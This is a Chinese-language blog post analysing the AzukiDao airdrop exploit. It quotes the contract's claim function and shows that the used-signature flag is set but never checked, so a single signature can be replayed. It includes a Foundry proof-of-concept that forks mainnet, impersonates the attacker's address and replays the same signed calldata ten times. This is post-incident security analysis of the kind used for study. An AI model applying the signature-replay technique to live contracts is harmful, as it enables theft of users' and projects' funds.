---
title: "AzukiDao攻击事件分析及复现"
date: 2023-07-13T0:19:30-04:00
categories:
  - blog
tags:
  - analysis
---

## AzukiDao攻击事件分析及复现

### 攻击事件分析
 - 被攻击合约：https://etherscan.io/address/0x8189AFBE7b0e81daE735EF027cd31371b3974FeB
 - 攻击者地址：0x85D231C204B82915c909A05847CCa8557164c75e

从下图可以看到攻击者的地址多次调用了Claim方法。
![image](https://github.com/chriscczhou/chriscczhou.github.io/assets/108380177/6ce2f0ea-eeeb-4070-addc-318fbb8fd590)

查看合约的Claim方法代码分析：
```
    function claim(
        address[] memory _contracts,      // NFT contracts: azuki + beanz + elementals
        uint256[] memory _amounts,        // token amount for every contract: 2 + 3 + 1
        uint256[] memory _tokenIds,       // all token id, tokenIds.length = sum(amounts)
        uint256 _claimAmount,
        uint256 _endTime,
        bytes memory _signature          // sender + contracts + tokenIds + claimAmount + endTime
    ) external whenNotPaused nonReentrant {
        // check length
        require(_contracts.length == _amounts.length, "contracts length not match amounts length");

        // check contracts
        for (uint256 i = 0; i < _contracts.length; i++) {
            require(contractSupports[_contracts[i]], "contract not support");
        }

        uint256 totalAmount;
        for (uint256 j = 0; j < _amounts.length; j++) {
            totalAmount = totalAmount + _amounts[j];
        }
        require(totalAmount == _tokenIds.length, "total amount not match tokenId length");

        // check signature
        bytes32 message = keccak256(abi.encodePacked(msg.sender, _contracts, _tokenIds, _claimAmount, _endTime));
        require(signatureManager == message.toEthSignedMessageHash().recover(_signature), "invalid signature");
        require(block.timestamp <= _endTime, "signature expired");

        // check NFT
        uint256 endIndex;
        uint256 startIndex;
        for (uint256 i = 0; i < _amounts.length; i++) {

            endIndex = startIndex + _amounts[i];

            for (uint256 j = startIndex; j < endIndex; j++) {
                address contractAddr = _contracts[i];
                uint256 tokenId = _tokenIds[j];
                require(IERC721(contractAddr).ownerOf(tokenId) == msg.sender, "not owner");
                tokenClaimed[contractAddr][tokenId] = true;
            }
            startIndex = endIndex;
        }
        signatureClaimed[_signature] = true;
        // transfer token
        _transfer(address(this), msg.sender, _claimAmount);
    }
```

发现`signatureClaimed[_signature] = true; `，这行用来记录签名是否领取过空投，但是却没有对这个`signatureClaimed[_signature] `进行判断，导致同一个签名可以重复领取的问题。攻击者发现了这个问题，然后多次领取空投，砸盘套现。

### 攻击复现：
使用Foundry复现，使用同一个签名领取了10次，最终余额为312500：
```
pragma solidity 0.8.0;
import "forge-std/Test.sol";

interface IBean {
    function balanceOf(address account) external view returns (uint256);
}



contract exp is Test{
    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth",17593210);
    }


    function testexp() external {
        IBean azukidao = IBean(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB);
        for(uint256 i;i<10;i++){
            vm.prank(address(0x85D231C204B82915c909A05847CCa8557164c75e));
            address(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB).call(hex"3319f3e300000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000069e10de76676d08000000000000000000000000000000000000000000000000000000000000649f008f00000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000ed5af388653567af2f388e6224dc7c4b3241c544000000000000000000000000b6a37b5d14d502c3ab0ae6f3a0e058bc9517786e000000000000000000000000306b1ea3ecdf94ab739f1910bbda052ed4a9f9490000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000016640000000000000000000000000000000000000000000000000000000000000041b0c7a8994624f4187fa28019f1ed169887d814cc72a7c6e5a9afe78a0cc825e55f7fca08df0c2dc16ce05f2a39bc15949d6bb07c5283cf9e131ae51251e719e61b00000000000000000000000000000000000000000000000000000000000000");
            log_named_uint("bean balance:",azukidao.balanceOf(address(0x85D231C204B82915c909A05847CCa8557164c75e))/1e18);
        }
    }

}
```
![image](https://github.com/chriscczhou/chriscczhou.github.io/assets/108380177/9deedf9b-124e-4347-996c-3f9a332d8c39)





